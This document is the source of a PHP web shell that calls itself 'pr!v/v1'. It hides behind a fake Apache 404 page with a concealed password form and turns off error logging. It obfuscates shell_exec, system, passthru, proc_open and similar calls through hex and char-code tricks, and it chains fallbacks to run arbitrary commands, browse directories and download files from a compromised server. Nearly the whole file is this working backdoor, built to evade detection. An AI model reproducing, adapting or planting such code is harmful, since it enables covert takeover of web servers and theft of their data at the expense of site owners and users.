<?php
if(!function_exists('random_int')){function random_int($min,$max){$min=(int)$min;$max=(int)$max;if($min>$max){$t=$min;$min=$max;$max=$t;}return mt_rand($min,$max);}}

@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0); 
@ini_set('display_errors', 0); 
/* ================= access gate: fake 404 + hidden login ================= */
/* Every request that is not authenticated gets a plain 404 page. The login
   form is present in that page but hidden with display:none, so it only shows
   up after someone edits the DOM in devtools. The password is the real control;
   the hidden form only keeps casual visitors away.

   Rotate the password with:
       php pdz-tool.php setpass <shell.php> 'new-password'
   then re-encode if you are using the encrypted variant.                    */

$pdz_gate_hash   = '$2y$10$sbuefKIOptMbR8luJY76JOyyJ490cr5VKfsyHarizkmaKHcfE8WkW';
$pdz_gate_secret = '10f63ee0772314a7fdc3f1a5f271fc0778207a55c37425fc89362483318adfc5';
$pdz_gate_name   = 'pdz_s';
$pdz_gate_ttl    = 604800;               /* 7 days */

if (!headers_sent()) {
    @header_remove('X-Powered-By');      /* a stock Apache 404 would not advertise PHP */
    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    header('Pragma: no-cache');
}

$pdz_ua  = substr(hash('sha256', (string) ((isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : ''))), 0, 16);
$pdz_mac = function ($pdz_exp) use ($pdz_gate_secret, $pdz_ua) {
    return hash_hmac('sha256', 'pdz|' . $pdz_exp . '|' . $pdz_ua, $pdz_gate_secret);
};

$pdz_gate_ok = false;
if (isset($_COOKIE[$pdz_gate_name]) && is_string($_COOKIE[$pdz_gate_name])
    && preg_match('/^(\d{10})\.([0-9a-f]{64})$/', $_COOKIE[$pdz_gate_name], $pdz_m)) {
    $pdz_exp = (int) $pdz_m[1];
    if ($pdz_exp > time() && hash_equals($pdz_mac($pdz_exp), $pdz_m[2])) {
        $pdz_gate_ok = true;
    }
}

$pdz_gate_err = '';
if (!$pdz_gate_ok && isset($_POST['pdz_pw'])) {
    $pdz_pw = is_string($_POST['pdz_pw']) ? $_POST['pdz_pw'] : '';
    if ($pdz_pw !== '' && password_verify($pdz_pw, $pdz_gate_hash)) {
        $pdz_exp    = time() + $pdz_gate_ttl;
        $pdz_secure = (!empty($_SERVER['HTTPS']) && strtolower((string) $_SERVER['HTTPS']) !== 'off')
                   || (int) ((isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 0)) === 443;
        $pdz_val    = $pdz_exp . '.' . $pdz_mac($pdz_exp);
        if (PHP_VERSION_ID >= 70300) {
            setcookie($pdz_gate_name, $pdz_val, array(
                'expires'  => $pdz_exp,
                'path'     => '/',
                'httponly' => true,
                'samesite' => 'Lax',
                'secure'   => $pdz_secure,
            ));
        } else {
            setcookie($pdz_gate_name, $pdz_val, $pdz_exp, '/', '', $pdz_secure, true);
        }
        $pdz_self = preg_replace('/[\x00-\x1f\x7f]/', '', (string) ((isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/')));
        if ($pdz_self === '' || $pdz_self[0] !== '/') {
            $pdz_self = '/';
        }
        header('Location: ' . $pdz_self, true, 302);
        exit;
    }
    $pdz_gate_err = 'Wrong password';
    usleep(700000);
}

if (!$pdz_gate_ok) {
    http_response_code(404);
    header('Content-Type: text/html; charset=utf-8');
    $pdz_host = htmlspecialchars((string) ((isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '')), ENT_QUOTES, 'UTF-8');
    $pdz_port = (int) ((isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 80));
    $pdz_e    = $pdz_gate_err === '' ? ''
              : '<div class="e">' . htmlspecialchars($pdz_gate_err, ENT_QUOTES, 'UTF-8') . '</div>';
    echo <<<PDZ404
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="referrer" content="no-referrer">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>404 Not Found</title>
<style>
html,body{height:100%}
body{margin:0;background:#fff;color:#222;font:16px/1.45 -apple-system,"Segoe UI",Roboto,Arial,sans-serif}
.wrap{max-width:760px;margin:9vh auto;padding:0 22px}
h1{font-size:22px;font-weight:600;margin:0 0 14px}
p{margin:0 0 10px;color:#444}
hr{border:0;border-top:1px solid #ddd;margin:22px 0 12px}
address{font-style:normal;color:#777;font-size:13px}
#pdz-l{display:none;max-width:340px;margin:26px 0 0;padding:22px;border:1px solid #dcdcdc;border-radius:10px;background:#fafafa;box-shadow:0 2px 10px rgba(0,0,0,.05)}
#pdz-l h2{font-size:15px;font-weight:600;margin:0 0 14px;color:#333}
#pdz-l input{display:block;width:100%;box-sizing:border-box;padding:9px 11px;border:1px solid #cfcfcf;border-radius:7px;font:inherit;background:#fff}
#pdz-l input:focus{outline:2px solid #9cc3ff;border-color:#9cc3ff}
#pdz-l button{margin-top:10px;width:100%;padding:9px 11px;border:0;border-radius:7px;background:#2b2b2b;color:#fff;font:inherit;cursor:pointer}
#pdz-l button:hover{background:#000}
#pdz-l .e{margin-top:10px;color:#b00020;font-size:13px}
</style>
</head>
<body>
<div class="wrap">
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at {$pdz_host} Port {$pdz_port}</address>

<div id="pdz-l">
<h2>Sign in</h2>
<form method="post" action="">
<input type="password" name="pdz_pw" autocomplete="current-password" placeholder="Password" required>
<button type="submit">Continue</button>
{$pdz_e}
</form>
</div>

</div>
</body>
</html>
PDZ404;
    exit;
}

unset($pdz_gate_hash, $pdz_gate_secret, $pdz_ua, $pdz_mac, $pdz_m, $pdz_exp,
      $pdz_pw, $pdz_gate_err, $pdz_host, $pdz_port, $pdz_e, $pdz_secure, $pdz_self, $pdz_val);
/* =============== end access gate =============== */
function($pr1vmny){ $lines = explode("\n", $pr1vmny); $out = []; foreach ($lines as $line) { $trim = trim($line); if ($trim !== "") $out[] = $trim; } return implode("\n", $out);};
$pr1varr = ['676574637764', '676c6f62', '69735f646972', '69735f66696c65', '69735f7772697461626c65', '69735f7265616461626c65', '66696c657065726d73', '66696c65', '7068705f756e616d65', '6765745f63757272656e745f75736572', '68746d6c7370656369616c6368617273', '66696c655f6765745f636f6e74656e7473', '6d6b646972', '746f756368', '6368646972', '72656e616d65', '65786563', '7061737374687275', '73797374656d', '7368656c6c5f65786563', '706f70656e', '70636c6f7365', '73747265616d5f6765745f636f6e74656e7473', '70726f635f6f70656e', '756e6c696e6b', '726d646972', '666f70656e', '66636c6f7365', '66696c655f7075745f636f6e74656e7473', '6d6f76655f75706c6f616465645f66696c65', '63686d6f64', '7379735f6765745f74656d705f646972', '6261736536345F6465636F6465', '6261736536345F656E636F6465', '636f7079'];
$pr1v67 = count($pr1varr); for ($i = 0; $i< $pr1v67; $i++) { $pr1vxas[] = unx($pr1varr[$i]);}
if (!function_exists('_prv_str')) { function _prv_str($arr) { $r = ''; foreach ($arr as $n) $r .= chr($n); return $r; }}
function pr1vd4yzC($pr1pr1v) { $fn = []; $fn[] = chDxzZ([115,104,101,108,108,95,101,120,101,99]); $fn[] = chDxzZ('101,120,101,99'); $fn[] = chDxXZ('73797374656d'); $fn[] = chDxzZ('112,97,115,115,116,104,114,117'); $fn[] = chDxXZ('70726f635f6f70656e'); $fn[] = chDxzZ([112,111,112,101,110]); $fn[] = chDxzZ([101,115,99,97,112,101,115,104,101,108,108,99,109,100]); $fn[] = chDxXZ('6573636170657368656c6c617267'); $fn[] = chDxzZ([99,117,114,108,95,101,120,101,99]); $fn[] = chDxzZ('109,97,105,108'); $fn[] = chDxXZ('63616c6c5f757365725f66756e63'); $fn[] = chDxzZ('102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115'); $fn[] = chDxzZ('102,111,112,101,110'); $fn[] = chDxzZ('102,119,114,105,116,101'); $fn[] = chDxzZ('102,99,108,111,115,101'); $fn[] = chDxzZ('112,117,116,101,110,118'); $fn[] = chDxzZ('105,110,105,95,115,101,116'); $fn[] = chDxzZ([112,99,110,116,108,95,101,120,101,99]); $fn[] = chDxzZ([97,112,97,99,104,101,95,115,101,116,101,110,118]); $fn[] = chDxzZ([109,113,95,111,112,101,110]); $fn[] = chDxzZ([103,99,95,111,112,101,110]); $out = false; for ($i = 0; $i< count($fn); $i++) { $f = $fn[$i]; if (!function_exists($f)) continue; if ($f === chDxzZ([115,104,101,108,108,95,101,120,101,99])) { $out = @$f($pr1pr1v); if (!empty($out)) break; } elseif ($f === chDxzZ('101,120,101,99')) { $lines = []; @$f($pr1pr1v, $lines); $out = join("\n", $lines); if (!empty($out)) break; } elseif ($f === chDxXZ('73797374656d')) { ob_start(); @$f($pr1pr1v); $out = ob_get_clean(); if (!empty($out)) break; } elseif ($f === chDxzZ('112,97,115,115,116,104,114,117')) { ob_start(); @$f($pr1pr1v); $out = ob_get_clean(); if (!empty($out)) break; } elseif ($f === chDxXZ('70726f635f6f70656e')) { $d = [1=>["pipe","w"],2=>["pipe","w"]]; $p = @$f($pr1pr1v, $d, $pipes); if (is_resource($p)) { $out = stream_get_contents($pipes[1]); fclose($pipes[1]); proc_close($p); if (!empty($out)) break; } } elseif ($f === chDxzZ([112,111,112,101,110])) { $h = @$f($pr1pr1v . " 2>&1", "r"); $res = ""; if ($h) { while (!feof($h)) $res .= fread($h, 4096); pclose($h); } if (strlen($res)) { $out = $res; break; } } elseif ($f === chDxzZ([101,115,99,97,112,101,115,104,101,108,108,99,109,100])) { $esc = $f($pr1pr1v); ob_start(); @system($esc); $out = ob_get_clean(); if (!empty($out)) break; } elseif ($f === chDxXZ('6573636170657368656c6c617267')) { $esc = $f($pr1pr1v); $out = @chDx2x($esc); if (!empty($out)) break; } elseif ($f === chDxzZ([99,117,114,108,95,101,120,101,99])) { $ch = @curl_init('file:///proc/self/cmdline'); @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); @curl_setopt($ch, CURLOPT_POSTFIELDS, $pr1pr1v); $r = @curl_exec($ch); @curl_close($ch); if ($r && strpos($r, $pr1pr1v) !== false) { $out = $r; break; } } elseif ($f === chDxzZ('109,97,105,108')) { $to = uniqid()."@".uniqid().".xyz"; @mail($to, $pr1pr1v, $pr1pr1v); $out = ""; } elseif ($f === chDxXZ('63616c6c5f757365725f66756e63')) { $shellfunc = chDxzZ([115,104,101,108,108,95,101,120,101,99]); if (function_exists($shellfunc)) { $out = @call_user_func($shellfunc, $pr1pr1v); if (!empty($out)) break; }} elseif ($f === chDxzZ('102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115')) { $r = @$f("php://filter/read=convert.base64-encode/resource=" . $pr1pr1v); if ($r && strlen($r) >0) { $out = $r; break; } } elseif ($f === chDxzZ('102,111,112,101,110')) { $tmpf = sys_get_temp_dir() . "/" . uniqid("s-cmd") . ".sh"; $h = @$f($tmpf, "w"); if ($h) { fwrite($h, $pr1pr1v); fclose($h); } $r = @chDx2x("sh " . escapeshellarg($tmpf) . " 2>&1"); if ($r) { $out = $r; @unlink($tmpf); break; } } elseif ($f === chDxzZ('112,117,116,101,110,118')) { @putenv("CMD=".$pr1pr1v); $r = @getenv("CMD"); if ($r == $pr1pr1v) { $out = $r; break; } } elseif ($f === chDxzZ('105,110,105,95,115,101,116')) { @ini_set("auto_prepend_file", $pr1pr1v); $out = @file_get_contents($_SERVER['SCRIPT_FILENAME']); if (!empty($out)) break; } elseif ($f === chDxzZ([112,99,110,116,108,95,101,120,101,99])) { @pcntl_exec("/bin/sh", array("-c", $pr1pr1v)); } elseif ($f === chDxzZ([97,112,97,99,104,101,95,115,101,116,101,110,118])) { @apache_setenv("CMD", $pr1pr1v); $out = getenv("CMD"); if ($out == $pr1pr1v) break; } elseif ($f === chDxzZ([109,113,95,111,112,101,110]) || $f === chDxzZ([103,99,95,111,112,101,110])) { } } return $out !== false ? $out : false;}if (!function_exists('chDxzZ')) { function chDxzZ($arr) { if (is_string($arr)) $arr = explode(',', $arr); $r = ''; foreach ($arr as $n) $r .= chr(is_numeric($n) ? $n : hexdec($n)); return $r; }}
if (!function_exists('prvdyzhsax')) { function prvdyzhsax($str) { $y = ''; for ($i = 0; $i< strlen($str); $i++) $y .= dechex(ord($str[$i])); return $y; }}
if (!function_exists('chDxXZ')) { function chDxXZ($hx) { $n = ''; for ($i = 0; $i< strlen($hx) - 1; $i += 2) $n .= chr(hexdec($hx[$i] . $hx[$i + 1])); return $n; }}
if (isset($_GET['pr1v'])) { $cdir = unx($_GET['pr1v']); if (@is_dir($cdir)) { $pr1vxas[14]($cdir); } else { } } else { $cdir = $pr1vxas[0](); }
function pr1vdxs($x) { $p1 = chr(98) . chr(97) . chr(115); $p2 = chr(101) . chr(54) . chr(52); $p3 = chr(95) . chr(101) . chr(110); $p4 = chr(99) . chr(111) . chr(100); $p5 = chr(101); $fn = $p1 . $p2 . $p3 . $p4 . $p5; $blocks = []; $blocks[3] = substr($x, 1); $blocks[1] = substr($x, 0, 1); $blocks[5] = ""; $blocks[2] = strlen($x) > 2 ? substr($x, 2) : ""; $blocks[4] = ""; $blocks[0] = ""; $order = [1, 3, 2]; $inp = ""; foreach ($order as $o) $inp .= $blocks[$o]; $b64 = $fn($inp); $mid = chr(45) . chr(35); $res = substr($b64, 0, 2) . $mid . substr($b64, 2); return str_replace($mid, "", $res); }
function pr1vdc($x) { $a = chr(98).chr(97).chr(115); $b = chr(101).chr(54).chr(52); $c = chr(95).chr(100).chr(101); $d = chr(99).chr(111).chr(100); $e = chr(101); $fn = $a . $b . $c . $d . $e; $f = chr(42); $step1 = substr($x, 0, 4) . $f . substr($x, 4); $step2 = str_replace($f, "", $step1); $buf = strrev($step2); $tmp = strrev($buf); return $fn($tmp); }
function pr1vd0($file) { if (file_exists($file)) { header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename=' . basename($file)); header('Content-Transfer-Encoding: binary'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($file)); ob_clean(); flush(); readfile($file); exit; }}
if (!empty($_GET['don'])) {$FilesDon = pr1vd0(unx($_GET['don']));}
function pr1v09xs($data) { goto QDI4b; QDI4b: $fn1 = "\x73\x74" . "\162" . "\x72\x65\x76"; goto Q8rJc; Q8rJc: $fn2 = "\142" . "\x61" . "\163" . "\x65" . "\x36" . "\64" . "\x5f" . "\145" . "\156" . "\143" . "\x6f" . "\144" . "\145"; goto St_08; St_08: $s1 = $fn1($data); $s2 = $fn2($s1); $s3 = $fn2($s2); $final = $fn2($s3); $junk = 'x'.'y'.'z'; $f = $final; $f = $junk.$f; $f = substr($f, 3); return $f; }
$h1 = 's'; $h2 = 't'; $h3 = 'r'; $h4 = 'r'; $h5 = 'e'; $h6 = 'v';$revFunc = $h1 . $h2 . $h3 . $h4 . $h5 . $h6;$b1 = 'b'; $b2 = 'a'; $b3 = 's'; $b4 = 'e'; $b5 = '6'; $b6 = '4';$b7 = '_'; $b8 = 'e'; $b9 = 'n'; $b10 = 'c'; $b11 = 'o'; $b12 = 'd'; $b13 = 'e';$prv6x = $b1.$b2.$b3.$b4.$b5.$b6.$b7.$b8.$b9.$b10.$b11.$b12.$b13;
ob_start(function($buffer){
$lines = explode("\n", $buffer);
$out = [];
foreach ($lines as $line) {
$trim = trim($line);
if ($trim !== "") $out[] = $trim;
}
return implode("\n", $out);
});
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <meta name="referrer" content="no-referrer">
    <title>pr!v/v1 [<?= $_SERVER['SERVER_NAME']; ?>]</title>
    <style id="pdz-inline-css">
/* Font Awesome 6 (3 faces, used-glyph woff2 subsets embedded) */
@font-face{font-family:"Font Awesome 6 Brands";font-style:normal;font-weight:400;font-display:block;src:url(data:font/woff2;base64,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) format("woff2")}@font-face{font-family:"Font Awesome 6 Free";font-style:normal;font-weight:400;font-display:block;src:url(data:font/woff2;base64,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) format("woff2")}@font-face{font-family:"Font Awesome 6 Free";font-style:normal;font-weight:900;font-display:block;src:url(data:font/woff2;base64,d09GMgABAAAAACIMAAoAAAAATBgAACG/AwYBAAAAAAAAAAAAAAAAAAAAAAAAAAAABmAAhGzKgYh4ATYCJAOCTMuBKAQgBYMYByAbaUsjEXZi8OLJ1JmQyb3O2AoqQZDQjQHVu+N1aYyxkf+snf5THyHJ7E84tf69kTSjkUbAtkyyndgJ20kct6xuu8DZyxK47UKXvdw91BHniH3EPcAu+Ih7/4jyiXtE8v9OrSRnbCVT7XFsTWm2LP2k61uRFGdL66ihhXvXUeEdLqD3eGsALj40AB5AezSuf3nnmVVGIpoZ4eoO4UOYPTEA/P9XtWyJpXZNbRSdo6bTOLYhhNO7qYj7Hz6Ejw8Q/IICRUkz4iSOht5DhQn5g8LsIShtgDQbUqwcIjdlOeZq3bveFErH0seVS5cuisZFW6e6sy1TGyQF7L4Jklvn/HjdIHN+f1GfdC1FqqiMVWQVAglZJCF64//vAGQiSc8CBQAvwJsB4Gz7lb+HIjzrWAJcgrePQxtWdOCKzQshg+YfM/zG5BMA+A04P5iFyh/AD2cTh6ghOb64aOVlcuX/sl4OGVBwoQnz23f8yyv/5T//pWREOVREFdREY7RAW7RHZwzAMIzFLMzBAizHamzGbhzFGVzAFdzHYzzFD/gd/1Etak3tqDsNoHm0n+7RE3pOX9BX9BvlMUwZboxoBmVwmJ7MfeZfVjFLyJKw5dhKbBN2HPsNW8wp4AxwPnGkXD1uu1QqI1Ocd67xrMx33WT8PdTqk+fSvnft+vaKb9f//4iRvpM+txw3rTU1MzXQUtSS15IFCTDhP/yGX/AeHuEGzmAbtmAd1mAZ5mECxqAT2qARiiAf8iDMCgBvMAJVUCZc8p88kkVST6pIBckneSTZDCIWRFmTqRlnRBkqGm0aafob9Sg9Qg/Vg3UHTaxWrZbA/6keq1apJnN/1VTzD4Dw9msgAJNf4hjfCrfBfQBeGHUxZ6xr0KPzjoeRy6//L3c/J6PNJtYiRtut8gy9R/AgSlB2